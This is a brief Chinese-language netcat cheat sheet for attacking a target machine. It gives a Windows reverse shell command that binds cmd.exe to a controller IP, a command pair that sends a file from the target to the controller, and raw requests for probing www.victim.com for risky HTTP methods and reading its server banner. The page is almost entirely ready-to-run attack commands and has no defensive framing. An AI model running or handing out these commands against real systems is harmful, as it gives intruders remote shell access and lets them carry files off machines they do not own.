### 反弹shell
```
靶机：nc.exe -vv 控制端IP 6666 -e  c:\windows\system32\cmd.exe
控制机：nc -lvp 6666
```
### 传输文件
```
控制机：nc -l 6666 >1.txt
靶机：nc 控制端IP 6666 < c:\1.txt
```
### 手工测试目标是否允许危险的请求方式：put、move、options
```
nc.exe www.victim.com 80
OPTIONS / HTTP/1.1
Host: www.victim.com
```
### 查看web服务信息
```
nc.exe www.victim.com 80
HEAD / HTTP/1.0
```
